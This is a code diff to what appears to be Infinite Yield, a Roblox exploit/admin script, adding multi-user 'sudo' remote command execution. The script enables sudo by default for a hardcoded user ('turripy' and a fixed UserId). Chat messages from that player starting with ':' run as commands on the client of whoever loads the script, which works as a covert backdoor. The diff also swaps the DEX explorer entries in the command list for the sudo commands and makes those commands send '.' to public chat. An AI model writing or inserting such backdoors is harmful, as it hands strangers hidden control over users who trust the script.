@@ -19,20 +19,62 @@ currentVersion = '5.9.3'
 Players = game:GetService("Players")
 
 -- Sudo functionality variables
-local sudoUser = "turripy" -- Default sudo user
-local sudoUserId = 4399621273 -- Default sudo user ID
+local sudoUsers = {"turripy"} -- Default sudo users (table)
+local sudoUserIds = {4399621273} -- Default sudo user IDs (table)
 local sudoEnabled = true
 
 -- Function to check if a player has sudo access
 local function hasSudoAccess(player)
     if not sudoEnabled then return false end
-    return player.Name:lower() == sudoUser:lower() or player.UserId == sudoUserId
+    
+    -- Check by UserId first (more reliable)
+    for _, id in pairs(sudoUserIds) do
+        if id > 0 and player.UserId == id then
+            return true
+        end
+    end
+    
+    -- Check by name as fallback
+    for _, name in pairs(sudoUsers) do
+        if player.Name:lower() == name:lower() then
+            return true
+        end
+    end
+    
+    return false
 end
 
--- Function to get player by name
+-- Function to add sudo user
+local function addSudoUser(player)
+    local playerName = player.Name
+    local playerId = player.UserId
+    
+    -- Check if already added
+    if hasSudoAccess(player) then
+        return false, "User already has sudo access"
+    end
+    
+    table.insert(sudoUsers, playerName)
+    table.insert(sudoUserIds, playerId)
+    return true, "Added sudo access for " .. playerName
+end
+
+-- Function to remove sudo user
+local function removeSudoUser(targetName)
+    for i, name in pairs(sudoUsers) do
+        if name:lower() == targetName:lower() then
+            table.remove(sudoUsers, i)
+            table.remove(sudoUserIds, i) -- Remove corresponding ID (even if nil)
+            return true, "Removed sudo access for " .. targetName
+        end
+    end
+    return false, "User not found in sudo list"
+end
+
+-- Function to get player by exact name match (security critical)
 local function getPlayerByName(name)
     for _, player in pairs(Players:GetPlayers()) do
-        if player.Name:lower():find(name:lower()) then
+        if player.Name:lower() == name:lower() then
             return player
         end
     end
@@ -4269,8 +4311,8 @@ end
 CMDs = {}
 CMDs[#CMDs + 1] = {NAME = 'discord / support / help', DESC = 'Invite to the Infinite Yield support server.'}
 CMDs[#CMDs + 1] = {NAME = 'console', DESC = 'Loads old Roblox console'}
-CMDs[#CMDs + 1] = {NAME = 'explorer / dex', DESC = 'Opens DEX by Moon'}
-CMDs[#CMDs + 1] = {NAME = 'olddex / odex', DESC = 'Opens Old DEX by Moon'}
+CMDs[#CMDs + 1] = {NAME = 'sudo [username1] [username2] ...', DESC = 'Adds sudo access for remote command execution (multiple users supported)'}
+CMDs[#CMDs + 1] = {NAME = 'removesudo [username]', DESC = 'Removes sudo access from a user'}
 CMDs[#CMDs + 1] = {NAME = 'remotespy / rspy', DESC = 'Opens Simple Spy V3'}
 CMDs[#CMDs + 1] = {NAME = 'audiologger / alogger', DESC = 'Opens Edges audio logger'}
 CMDs[#CMDs + 1] = {NAME = 'serverinfo / info', DESC = 'Gives you info about the server'}
@@ -5392,29 +5434,64 @@ Players.LocalPlayer.Chatted:Connect(function()
         end
 end)
 
--- Sudo chat monitoring for all players
-local function setupSudoChat(player)
-    if player == Players.LocalPlayer then return end
-    
-    player.Chatted:Connect(function(message)
-        if not hasSudoAccess(player) then return end
+-- TextChatService sudo monitoring
+local TextChatService = game:GetService("TextChatService")
+
+-- Modern TextChatService approach
+if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+    TextChatService.MessageReceived:Connect(function(message)
+        -- Guard against system messages with no TextSource
+        if not message.TextSource or not message.TextSource.UserId then return end
+        if not message.Text then return end
         
-        -- Check if message starts with ! (sudo command prefix)
-        if message:sub(1,1) == "!" then
-            local sudoCommand = message:sub(2) -- Remove the ! prefix
-            notify("Sudo Command", "Executing: " .. sudoCommand .. " from " .. player.Name)
+        local sendingPlayer = Players:GetPlayerByUserId(message.TextSource.UserId)
+        if not sendingPlayer or sendingPlayer == Players.LocalPlayer then return end
+        if not hasSudoAccess(sendingPlayer) then return end
+        
+        local messageText = message.Text
+        -- Check if message starts with : (sudo command prefix)
+        if messageText:sub(1,1) == ":" then
+            local sudoCommand = messageText:sub(2) -- Remove the : prefix
+            notify("Sudo Command", "Executing: " .. sudoCommand .. " from " .. sendingPlayer.Name)
             execCmd(sudoCommand, Players.LocalPlayer, true)
         end
     end)
-end
+else
+    -- Fallback to legacy Player.Chatted for older chat system
+    local function setupSudoChat(player)
+        if player == Players.LocalPlayer then return end
+        
+        player.Chatted:Connect(function(message)
+            if not hasSudoAccess(player) then return end
+            
+            -- Check if message starts with : (sudo command prefix)
+            if message:sub(1,1) == ":" then
+                local sudoCommand = message:sub(2) -- Remove the : prefix
+                notify("Sudo Command", "Executing: " .. sudoCommand .. " from " .. player.Name)
+                execCmd(sudoCommand, Players.LocalPlayer, true)
+            end
+        end)
+    end
 
--- Setup sudo chat for existing players
-for _, player in pairs(Players:GetPlayers()) do
-    setupSudoChat(player)
-end
+    -- Setup sudo chat for existing players
+    for _, player in pairs(Players:GetPlayers()) do
+        setupSudoChat(player)
+    end
 
--- Setup sudo chat for new players
-Players.PlayerAdded:Connect(setupSudoChat)
+    -- Setup sudo chat for new players and update offline users
+    Players.PlayerAdded:Connect(function(player)
+        setupSudoChat(player)
+        
+        -- Update offline users with their UserIds when they join
+        for i, name in pairs(sudoUsers) do
+            if name:lower() == player.Name:lower() and sudoUserIds[i] == 0 then
+                sudoUserIds[i] = player.UserId
+                notify("Sudo User Online", player.Name .. " is now online and updated with UserId")
+                break
+            end
+        end
+    end)
+end
 
 Cmdbar.PlaceholderText = "Command Bar ("..prefix..")"
 Cmdbar:GetPropertyChangedSignal("Text"):Connect(function()
@@ -9978,20 +10055,104 @@ addcmd('console',{},function(args, speaker)
 end)
 
 addcmd('sudo',{},function(args, speaker)
-        if args[1] then
-                local targetPlayer = getPlayerByName(args[1])
-                if targetPlayer then
-                        sudoUser = targetPlayer.Name
-                        sudoUserId = targetPlayer.UserId
-                        notify('Sudo Access Updated', 'Sudo access granted to: ' .. targetPlayer.Name .. ' (ID: ' .. targetPlayer.UserId .. ')')
+        -- Send "." to TextChatService
+        pcall(function()
+                local TextChatService = game:GetService("TextChatService")
+                if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+                        -- For modern TextChatService - find any available channel
+                        local channel = nil
+                        if TextChatService.TextChannels then
+                                channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral") 
+                                        or TextChatService.TextChannels:FindFirstChildOfClass("TextChannel")
+                        end
+                        if channel then
+                                pcall(function() channel:SendAsync(".") end)
+                        end
                 else
-                        -- Try to set by username directly
-                        sudoUser = args[1]
-                        sudoUserId = nil -- Will rely on name matching
-                        notify('Sudo Access Updated', 'Sudo access granted to: ' .. args[1] .. ' (not currently in game)')
+                        -- For legacy chat system
+                        pcall(function()
+                                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(".", "All")
+                        end)
+                end
+        end)
+        
+        if args[1] then
+                -- Add multiple users
+                local addedUsers = {}
+                local notFoundUsers = {}
+                
+                for i, username in pairs(args) do
+                        local targetPlayer = getPlayerByName(username)
+                        if targetPlayer then
+                                local success, msg = addSudoUser(targetPlayer)
+                                if success then
+                                        table.insert(addedUsers, targetPlayer.Name)
+                                else
+                                        -- User already has access
+                                        table.insert(addedUsers, targetPlayer.Name .. " (already authorized)")
+                                end
+                        else
+                                -- Add by username directly (for offline users)
+                                -- Check if username is not already in sudoUsers to avoid duplicates
+                                local alreadyExists = false
+                                for _, existingName in pairs(sudoUsers) do
+                                        if existingName:lower() == username:lower() then
+                                                alreadyExists = true
+                                                break
+                                        end
+                                end
+                                
+                                if not alreadyExists then
+                                        table.insert(sudoUsers, username)
+                                        table.insert(sudoUserIds, 0) -- Keep arrays aligned with 0 placeholder for offline users
+                                        table.insert(addedUsers, username .. " (offline)")
+                                else
+                                        table.insert(addedUsers, username .. " (already in list)")
+                                end
+                        end
+                end
+                
+                if #addedUsers > 0 then
+                        notify('Sudo Access Updated', 'Added sudo access for: ' .. table.concat(addedUsers, ", "))
                 end
         else
-                notify('Sudo Status', 'Current sudo user: ' .. sudoUser .. ' (ID: ' .. (sudoUserId or 'N/A') .. ')')
+                -- Show current sudo users
+                local userList = table.concat(sudoUsers, ", ")
+                notify('Sudo Status', 'Current sudo users: ' .. userList)
+        end
+end)
+
+addcmd('removesudo',{},function(args, speaker)
+        -- Send "." to TextChatService
+        pcall(function()
+                local TextChatService = game:GetService("TextChatService")
+                if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+                        -- For modern TextChatService - find any available channel
+                        local channel = nil
+                        if TextChatService.TextChannels then
+                                channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral") 
+                                        or TextChatService.TextChannels:FindFirstChildOfClass("TextChannel")
+                        end
+                        if channel then
+                                pcall(function() channel:SendAsync(".") end)
+                        end
+                else
+                        -- For legacy chat system
+                        pcall(function()
+                                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(".", "All")
+                        end)
+                end
+        end)
+        
+        if args[1] then
+                local success, msg = removeSudoUser(args[1])
+                if success then
+                        notify('Sudo Access Removed', msg)
+                else
+                        notify('Error', msg)
+                end
+        else
+                notify('Usage', 'removesudo [username] - Remove sudo access from a user')
         end
 end)
 
